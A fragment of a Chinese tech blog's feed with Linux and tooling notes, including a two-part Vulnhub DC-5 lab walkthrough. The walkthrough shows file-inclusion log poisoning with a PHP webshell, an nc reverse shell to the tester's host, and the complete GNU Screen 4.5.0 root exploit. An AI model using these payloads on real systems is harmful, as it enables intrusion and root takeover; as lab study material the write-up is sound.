title="网卡配置"></a>网卡配置</h2><p><code>vim /etc/suricata/suricata.yaml</code></p><p>本例中，网卡为<code>ens33</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># Linux high speed capture supportaf-packet:  - interface: ens33    # Number of receive threads. &quot;auto&quot; uses the number of cores......# default rulesdefault-rule-path: &#x2F;var&#x2F;lib&#x2F;suricata&#x2F;rulesrule-files:  - suricata.rules</code></pre></div><p>修改完成后重启服务<code>systemctl restart suricata</code></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用<code>2100498</code>规则进行测试。规则可在<code>/var/lib/suricata/rules/suricata.rules</code>查看：</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">alert ip any any -&gt; any any (msg:&quot;GPL ATTACK_RESPONSE id check returned root&quot;; content:&quot;uid&#x3D;0|28|root|29|&quot;; classtype:bad-unknown; sid:2100498; rev:7; metadata:created_at 2010_09_23, updated_at 2010_09_23;)</code></pre></div><p><code>tail</code>查看<code>fast.log</code>文件，运行<code>curl http://testmynids.org/uid/index.html</code>。可看到log文件中，增加到了监测内容。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># path of log filesfastlog_file:&quot;&#x2F;var&#x2F;log&#x2F;suricata&#x2F;fast.log&quot;log_file:&quot;&#x2F;var&#x2F;log&#x2F;suricata&#x2F;suricata.log&quot;statistics_file:&quot;&#x2F;var&#x2F;log&#x2F;suricata&#x2F;stats.log&quot;suricata tail -f fast.log # Outputs:05&#x2F;25&#x2F;2021-17:10:53.943090  [**] [1:2013028:5] ET POLICY curl User-Agent Outbound [**] [Classification: Attempted Information Leak] [Priority: 2] &#123;TCP&#125; 192.168.205.6:50856 -&gt; 13.225.103.101:8005&#x2F;25&#x2F;2021-17:10:54.040108  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] &#123;TCP&#125; 13.225.103.101:80 -&gt; 192.168.205.6:50856</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">curl http:&#x2F;&#x2F;testmynids.org&#x2F;uid&#x2F;index.html# Outputs:uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://suricata.readthedocs.io/en/latest/">https://suricata.readthedocs.io/en/latest/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>Suricata</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Suricata</tag>
      
      <tag>入侵检测</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSH多网卡下指定IP</title>
    <link href="/posts/421700e0/"/>
    <url>/posts/421700e0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>一个虚拟机设置了多张网卡，默认的ssh有时候连接失败。</p><p>之前没有注意设置，需要专门设置一下IP保证正常运行。</p></blockquote><p>编辑配置文件<code>vim /etc/ssh/sshd_config</code></p><div class="code-wrapper"><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">#Port 22#AddressFamily any#ListenAddress 0.0.0.0 </code></pre></div><p>修改其中的<code>ListenAddress</code>即可</p><div class="code-wrapper"><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">#Port 22#AddressFamily anyListenAddress 192.168.205.3</code></pre></div><p>重启服务生效<code>systemctl restart sshd</code></p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu升级内核libssl依赖问题</title>
    <link href="/posts/9a2c4456/"/>
    <url>/posts/9a2c4456/</url>
    
    <content type="html"><![CDATA[<blockquote><p>升级ubuntu 16.04的内核时出现依赖libssl1.1.0问题</p></blockquote><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">下列软件包有未满足的依赖关系： linux-headers-5.3.0-050300rc4-generic : 依赖: libssl1.1 (&gt;&#x3D; 1.1.0) 但无法安装它E: 有未能满足的依赖关系。请尝试不指明软件包的名字来运行“apt-get -f install”(也可以指定一个解决办法)。</code></pre></div><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>单独下载安装一个<code>libssl1.1_1.1.0g-2ubuntu4.1_amd64.deb</code>文件然后再升级就可以了</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;o&#x2F;openssl&#x2F;libssl1.1_1.1.0g-2ubuntu4_amd64.debsudo dpkg -i libssl1.1_1.1.0g-2ubuntu4_amd64.deb</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://blog.csdn.net/z952957407/article/details/99690571">https://blog.csdn.net/z952957407/article/details/99690571</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ubuntu</tag>
      
      <tag>libssl</tag>
      
      <tag>内核升级</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SetUID、SetGID与Sticky BIT</title>
    <link href="/posts/8ee6b0b9/"/>
    <url>/posts/8ee6b0b9/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Linux除了我们常见的读(r)写(w)执行(x)权限外，还有三个较为特殊的权限SetUID、SetGID与Sticky BIT。</p></blockquote><h2 id="1-SetUID与SetGID"><a href="#1-SetUID与SetGID" class="headerlink" title="1. SetUID与SetGID"></a>1. SetUID与SetGID</h2><p>通常对于可执行程序能够设定<code>SetUID</code>权限，且命令执行者需要对该程序拥有<code>x</code>权限。</p><p><strong>设定<code>SetUID</code>权限后，命令执行者在执行程序时获得程序拥有者的身份，且身份改变仅在执行过程中有效。</strong></p><p>例：修改用户<code>passwd</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ll &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow &#x2F;usr&#x2F;bin&#x2F;passwd-rw-r--r-- 1 root root    3360  3月 30 15:40 &#x2F;etc&#x2F;passwd-rw-r----- 1 root shadow  1808  3月 30 15:40 &#x2F;etc&#x2F;shadow-rwsr-xr-x 1 root root   63960  2月  7  2020 &#x2F;usr&#x2F;bin&#x2F;passwd</code></pre></div><ul><li><p>可以看到普通用户并没有对<code>/etc/passwd</code>与<code>/etc/shadow</code>具有执行修改权限。但在实际使用需求上是有修改自己password的需求。</p></li><li><p>所以在用户的<code>/usr/bin/passwd</code>程序中，设置了<code>SetUID</code>即拥有者权限中的<code>s</code>。</p></li><li><p>可以看到<code>Others</code>用户具有可执行权限<code>x</code>，而程序拥有者设定了<code>SetUID</code>，同时程序拥有者为<code>root</code>。</p></li><li><p>所以<code>Others</code>用户在执行<code>/usr/bin/passwd</code>时，会临时获得<code>root</code>权限，从而能修改密码。</p></li></ul><blockquote><p>SetGID与SetUID原理基本相同。</p></blockquote><h2 id="2-Sticky-BIT"><a href="#2-Sticky-BIT" class="headerlink" title="2. Sticky BIT"></a>2. Sticky BIT</h2><p>通常对于目录能够设定<code>Sticky BIT</code>。用于避免非文件拥有者误操作文件。</p><p>例：对于<code>/tmp</code>目录所有用户都具有操作权限，但任何人创建的文件能被其他人任意修改与删除可能会带来错误。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ll -d &#x2F;tmpdrwxrwxrwt 19 root root 4096  4月 15 09:39 &#x2F;tmp</code></pre></div><p><strong>可以通过对<code>/tmp</code>目录设定<code>Sticky BIT</code>即权限最后的<code>t</code>，来保证其中的文件仅能够被文件拥有者修改。</strong></p><h2 id="3-权限修改"><a href="#3-权限修改" class="headerlink" title="3. 权限修改"></a>3. 权限修改</h2><p>在常规的<em>777</em>类型的模式下设置权限，在最前面增加一位设置<code>SetUID</code>、<code>SetGID</code>与<code>Sticky BIT</code>即可，分别对应4、2、1。或通过增加权限的方式。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 设置具有SetUID但其他用户只读的权限chmod 4744 filename# 设置setuid权限chmod u+s filename  # 设置setgid权限chmod g+s filename  # 设置stick bit权限，针对目录chmod o+t dirname  </code></pre></div><hr><blockquote><p>参考:</p><p><a href="https://blog.csdn.net/wxbmelisky/article/details/51649343">https://blog.csdn.net/wxbmelisky/article/details/51649343</a></p><p><a href="https://www.jianshu.com/p/70f9ea162ca9">https://www.jianshu.com/p/70f9ea162ca9</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>权限</tag>
      
      <tag>SetUID</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VSCode中配置Go相关插件失败问题</title>
    <link href="/posts/3d084d62/"/>
    <url>/posts/3d084d62/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>安装完VSCode的Go插件后，一般会提示安装一些提醒类的辅助插件。当在常规安装中经常失败。。</p><p>一部分工具是需要从 <a href="https://golang.org/x/tools">https://golang.org/x/tools</a> 上进行获取，然而，由于网络的原因，经常导致安装失败。</p><p>即使，当我们将科学上网配置为全局代理后，也是不能访问到工具的下载地址。</p><p>因为<strong>在直接打开VSCode时，其中的操作没有经过代理</strong>。</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>终端设置为系统代理后，通过终端打开VSCode再进行安装插件。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 地址端口等按照自己的配置进行调整# 终端代理没有写入配置文件的情况下，仅在当前环境生效(参考环境变量)export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890 http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890 all_proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:7890# 打开VSCode后，在控制台进行 go:install 安装插件code .&#x2F;</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://monsoir.github.io/Notes/Go/vscode-go.html">https://monsoir.github.io/Notes/Go/vscode-go.html</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VSCode</tag>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub DC-5 渗透测试(2)</title>
    <link href="/posts/e6bc9214/"/>
    <url>/posts/e6bc9214/</url>
    
    <content type="html"><![CDATA[<blockquote><p><code>Vulnhub DC-5</code> GetShell后的提权</p></blockquote><h2 id="1-利用点查找"><a href="#1-利用点查找" class="headerlink" title="1. 利用点查找"></a>1. 利用点查找</h2><p>查找所有具有setuid的指令</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@dc-5:~&#x2F;html$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null&#x2F;bin&#x2F;su&#x2F;bin&#x2F;mount&#x2F;bin&#x2F;umount&#x2F;bin&#x2F;screen-4.5.0&#x2F;usr&#x2F;bin&#x2F;gpasswd&#x2F;usr&#x2F;bin&#x2F;procmail&#x2F;usr&#x2F;bin&#x2F;at&#x2F;usr&#x2F;bin&#x2F;passwd&#x2F;usr&#x2F;bin&#x2F;chfn&#x2F;usr&#x2F;bin&#x2F;newgrp&#x2F;usr&#x2F;bin&#x2F;chsh&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device&#x2F;usr&#x2F;sbin&#x2F;exim4&#x2F;sbin&#x2F;mount.nfs</code></pre></div><p>可以看到在可执行文件中有个显著的程序<code>screen-4.5.0</code>。</p><p>通过<code>searchsploit</code>查找<code>screen 4.5</code>的可利用漏洞。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; searchsploit screen 4.5--------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                   |  Path--------------------------------------------------------------------------------- ---------------------------------GNU Screen 4.5.0 - Local Privilege Escalation                                    | linux&#x2F;local&#x2F;41154.shGNU Screen 4.5.0 - Local Privilege Escalation (PoC)                              | linux&#x2F;local&#x2F;41152.txt--------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results</code></pre></div><p>主要关注<code>/usr/share/exploitdb/exploits/linux/local/41154.sh</code>文件，可以看到直接给出了利用方式。</p><p>同时给出了<a href="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html">bug</a>介绍，简要看了一下主要是<strong>利用程序的check以root权限打开日志文件</strong>。这使得我们可以截断任何文件或创建一个具有任何目录中的任何内容的root文件，并且可以通过这种方式轻松地获取root权限。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;41154.sh&#x2F;41154.sh#!&#x2F;bin&#x2F;bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https:&#x2F;&#x2F;lists.gnu.org&#x2F;archive&#x2F;html&#x2F;screen-devel&#x2F;2017-01&#x2F;msg00025.html# HACK THE PLANET# ~ infodox (25&#x2F;1&#x2F;2017)echo &quot;~ gnu&#x2F;screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; &#x2F;tmp&#x2F;libhax.c#include &lt;stdio.h&gt;ls#include &lt;sys&#x2F;types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123;    chown(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 0, 0);    chmod(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 04755);    unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);&#125;EOFgcc -fPIC -shared -ldl -o &#x2F;tmp&#x2F;libhax.so &#x2F;tmp&#x2F;libhax.crm -f &#x2F;tmp&#x2F;libhax.ccat &lt;&lt; EOF &gt; &#x2F;tmp&#x2F;rootshell.c#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);&#125;EOFgcc -o &#x2F;tmp&#x2F;rootshell &#x2F;tmp&#x2F;rootshell.crm -f &#x2F;tmp&#x2F;rootshell.cecho &quot;[+] Now we create our &#x2F;etc&#x2F;ld.so.preload file...&quot;cd &#x2F;etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so...&#x2F;tmp&#x2F;rootshell</code></pre></div><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><p>上述<code>41154.sh</code>本来应该直接具有可执行性。但是上传到被攻击服务器上时，执行有错误。</p><p>对脚本稍作整理之后执行。执行过程并不复杂。</p><p><strong>将第一部分代码存于<code>/tmp/libhax.c</code>编译为<code>/tmp/libhax.so</code>。</strong></p><p><strong>内容主要是为了赋予<code>rootshell</code>可执行文件权限。</strong></p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;sys&#x2F;types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123;    chown(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 0, 0);    chmod(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 04755);    unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);&#125;</code></pre></div><p><strong>将第二部分代码存于<code>/tmp/rootshell.c</code>编译为<code>/tmp/rootshell</code>。</strong></p><p><strong>内容主要是设置<code>setuid</code>等权限，提权后运行<code>sh</code>。</strong></p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);&#125;</code></pre></div><p><strong>第三部分执行代码，可保存为shell脚本等待使用<code>poc.sh</code>。</strong></p><p><strong>内容主要是讲第一部分的提升<code>rootshell</code>权限的部分写入<code>/etc</code>的某个文件中，并引起执行。</strong></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">echo &quot;[+] Now we create our &#x2F;etc&#x2F;ld.so.preload file...&quot;cd &#x2F;etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so...&#x2F;tmp&#x2F;rootshell</code></pre></div><p><strong>将整理好的<code>libhax.so</code>、<code>rootshell</code>、<code>poc.sh</code>上传到靶机的<code>/tmp</code>下。赋予<code>poc.sh</code>权限，执行后看到提权成功。</strong></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@dc-5:~&#x2F;html$ cd &#x2F;tmpwww-data@dc-5:&#x2F;tmp$ lsdc5.shlibhax.so  rootshellwww-data@dc-5:&#x2F;tmp$ chmod +x poc.shwww-data@dc-5:&#x2F;tmp$ .&#x2F;poc.sh[+] Now we create our &#x2F;etc&#x2F;ld.so.preload file...[+] Triggering...&#39; from &#x2F;etc&#x2F;ld.so.preload cannot be preloaded (cannot open shared object file): ignored.[+] done!No Sockets found in &#x2F;tmp&#x2F;screens&#x2F;S-www-data.# whoamiroot# cd &#x2F;root# lsthisistheflag.txt#</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>Vulnhub</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub DC-5 渗透测试(1)</title>
    <link href="/posts/cd91c1d7/"/>
    <url>/posts/cd91c1d7/</url>
    
    <content type="html"><![CDATA[<blockquote><p>进行了一次Vulnhub DC-5 渗透测试，内容较为简单，主要练习相关环境的建立与测试流程。</p><p>靶机：<a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a></p></blockquote><h2 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1. 主机发现"></a>1. 主机发现</h2><p>利用<code>netdiscover</code>发现主机，<code>192.168.203.130</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ netdiscoverCurrently scanning: 192.168.234.0&#x2F;16   |   Screen View: Unique Hosts2 Captured ARP Req&#x2F;Rep packets, from 2 hosts.   Total size: 120_____________________________________________________________________________  IP            At MAC Address     Count     Len  MAC Vendor &#x2F; Hostname-----------------------------------------------------------------------------192.168.205.1   e2:b5:5f:2f:91:64      1      60  Unknown vendor192.168.205.7   00:0c:29:63:68:89      1      60  VMware, Inc.</code></pre></div><p>或者使用<code>nmap -sP 192.168.205.0/24</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -sP 192.168.205.0&#x2F;24Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-11 15:48 CSTNmap scan report for 192.168.205.1Host is up (0.00036s latency).MAC Address: E2:B5:5F:2F:91:64 (Unknown)Nmap scan report for 192.168.205.7Host is up (0.0012s latency).MAC Address: 00:0C:29:63:68:89 (VMware)Nmap scan report for 192.168.205.4Host is up.Nmap done: 256 IP addresses (3 hosts up) scanned in 2.08 seconds</code></pre></div><h2 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2. 端口扫描"></a>2. 端口扫描</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -sV -A 192.168.205.7Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-11 15:37 CSTNmap scan report for 192.168.205.7Host is up (0.00093s latency).Not shown: 998 closed portsPORT    STATE SERVICE VERSION80&#x2F;tcp  open  http    nginx 1.6.2|_http-server-header: nginx&#x2F;1.6.2|_http-title: Welcome111&#x2F;tcp open  rpcbind 2-4 (RPC #100000)| rpcinfo:|   program version    port&#x2F;proto  service|   100000  2,3,4        111&#x2F;tcp   rpcbind|   100000  2,3,4        111&#x2F;udp   rpcbind|   100000  3,4          111&#x2F;tcp6  rpcbind|   100000  3,4          111&#x2F;udp6  rpcbind|   100024  1          43447&#x2F;tcp   status|   100024  1          46548&#x2F;udp6  status|   100024  1          53003&#x2F;udp   status|_  100024  1          60147&#x2F;tcp6  statusMAC Address: 00:0C:29:63:68:89 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.93 ms 192.168.205.7OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds</code></pre></div><h2 id="3-入侵点测试"><a href="#3-入侵点测试" class="headerlink" title="3. 入侵点测试"></a>3. 入侵点测试</h2><p>可以看到主要可利用端口为<code>80</code>。</p><p>查看了Web页面，没有什么CMS，只有几个标题页脚和几个页面。</p><p>其中<code>Home</code>、<code>Solutions</code>、<code>About Us</code>、<code>FAQ</code>都是一些文字没有利用空间。</p><p>在<code>Contact</code>页面中有表单提交，进行尝试分析。</p><p><img src="/posts/cd91c1d7/contact.png" alt="contact"></p><p>在提交了几次表单后，发现<strong>页脚的年份在不断变化</strong>。</p><p>可能是引入了<code>footer.php</code>来输出页脚信息。</p><p><img src="/posts/cd91c1d7/footer.png" alt="footer"></p><h3 id="3-1-文件包含漏洞"><a href="#3-1-文件包含漏洞" class="headerlink" title="3.1 文件包含漏洞"></a>3.1 文件包含漏洞</h3><p>因为页脚信息可能是通过包含<code>footer.php</code>进行输出的，所以可能存在文件包含漏洞，这里简单读一下系统目录发现直接就能读：<code>http://192.168.205.7/thankyou.php?file=/etc/passwd</code></p><p>说明此处存在<strong>文件包含漏洞</strong>。</p><p><img src="/posts/cd91c1d7/file_include.png" alt="file_include"></p><p>同样可以使用伪协议来读取<code>thankyou.php</code>源码：<code>http://192.168.205.7/thankyou.php?file=php://filter/read=convert.base64-encode/resource=thankyou.php</code></p><p><img src="/posts/cd91c1d7/read_resource.png" alt="read_resource"></p><p>解码可以看到确实是通过包含<code>footer.php</code>用以输出页脚信息。</p><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">···&lt;footer&gt;&lt;?php$file &#x3D; $_GET[&#39;file&#39;];if(isset($file))&#123;include(&quot;$file&quot;);&#125;else&#123;include(&quot;footer.php&quot;);&#125;?&gt;&lt;&#x2F;footer&gt;···</code></pre></div><p>顺便看一下<code>footer.php</code>内容。</p><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;Random Gen Test$rndmYears &#x3D; array(    &quot;Copyright © 2017&quot;,     &quot;Copyright © 2018&quot;,     &quot;Copyright © 2019&quot;,     &quot;Copyright © 2020&quot;);echo $rndmYears[mt_rand(0, count($rndmYears)-1)];?&gt;</code></pre></div><h3 id="3-2-Nginx日志"><a href="#3-2-Nginx日志" class="headerlink" title="3.2 Nginx日志"></a>3.2 <code>Nginx</code>日志</h3><p>可以看到Web服务器使用了<code>Nginx</code>服务器，可以探测是否具有<code>Nginx</code>日志利用的可能。</p><p><img src="/posts/cd91c1d7/wappalyzer.png" alt="wappalyzer"></p><p>查看<code>Nginx</code>配置文件：<code>http://192.168.205.7/thankyou.php?file=/etc/nginx/nginx.conf</code></p><p><img src="/posts/cd91c1d7/file_conf.png" alt="file_conf"></p><p>可以看到log存放的目录：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log;error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</code></pre></div><p>之后发包测试带入<code>&lt;?php phpinfo();?&gt;</code>看是否执行。</p><p><img src="/posts/cd91c1d7/cmd_phpinfo.png" alt="cmd_phpinfo"></p><p>之后验证读取日志文件：<code>http://192.168.205.7/thankyou.php?file=/var/log/nginx/error.log</code></p><p><img src="/posts/cd91c1d7/phpinfo.png" alt="phpinfo"></p><p>发现成功显示，说明Nginx日志写入命令成功执行。</p><h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h2><p>之后结合本地文件包含与Nginx日志进行Getshell。</p><p>传入一句话<code>http://192.168.205.7/thankyou.php?file=&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;</code></p><p><img src="/posts/cd91c1d7/send_cmd.png" alt="send_cmd"></p><p>可以看到成功读取内容：<code>http://192.168.205.7/thankyou.php？file=/var/log/nginx/error.log&amp;cmd=ls</code></p><p><img src="/posts/cd91c1d7/cmd_ls.png" alt="cmd_ls"></p><p>反弹shell：<code>/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc -e /bin/sh 192.168.205.4 4444</code></p><p><img src="/posts/cd91c1d7/cmd_nc.png" alt="cmd_nc"></p><p>nc连接，反弹成功。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nc -lvp 4444listening on [any] 4444 ...192.168.205.7: inverse host lookup failed: Unknown hostconnect to [192.168.205.4] from (UNKNOWN) [192.168.205.7] 57668lsabout-us.phpcontact.phpcssfaq.phpfooter.phpimagesindex.phpsolutions.phpthankyou.php</code></pre></div><p>切换为交互式<code>bash</code>：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">···solutions.phpthankyou.phppython -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;www-data@dc-5:~&#x2F;html$ lslsabout-us.php  css      footer.php  index.php  thankyou.phpcontact.php   faq.php  images   solutions.phpwww-data@dc-5:~&#x2F;html$</code></pre></div><p>之后为提权内容参见*Vulnhub DC-5 渗透测试(2)*。</p>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>Vulnhub</tag>
      
      <tag>文件包含</tag>
      
      <tag>Nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mac删除Launchpad残留图标</title>
    <link href="/posts/98807702/"/>
    <url>/posts/98807702/</url>
    
    <content type="html"><![CDATA[<p>在<code>finder</code>中前往<code>/private/var/folders</code>。</p><p>在<code>folders</code>中搜索<code>com.apple.dock.launchpad</code>。</p><p>在<code>终端</code>进入<code>com.apple.dock.launchpad/db</code>目录</p><p>执行以下命令，<code>What you want del</code>为你想要清除的残留图标名。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlite3 db &quot;delete from apps where title&#x3D;&#39;What you want del&#39;;&quot;&amp;&amp;killall Dock</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>Mac</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
      <tag>Launchpad</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo链接优化:abbrlink</title>
    <link href="/posts/6e344d64/"/>
    <url>/posts/6e344d64/</url>
    
    <content type="html"><![CDATA[<blockquote><p><code>Hexo</code>博客的链接如果显示中文，在一些场景的超链接识别可能不完全，如果使用转码则中文转码较长较乱。</p><p>这里使用<a href="https://github.com/rozbo/hexo-abbrlink">hexo-abbrlink</a>插件进行优化链接。</p></blockquote><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npm install hexo-abbrlink --save</code></pre></div><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>修改博客配置文件<code>_config.yml</code>内容</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">permalink: posts&#x2F;:abbrlink&#x2F;## abbrlink confabbrlink:  alg: crc32  # 算法：crc16(default) and crc32  rep: hex    # 进制：dec(default) and hex</code></pre></div><p>之后<code>md</code>文件的<code>Front-matter</code> 内会增加<code>abbrlink</code> 字段。无需操作。</p><hr><blockquote><p>参考：</p><p><a href="https://github.com/rozbo/hexo-abbrlink">https://github.com/rozbo/hexo-abbrlink</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
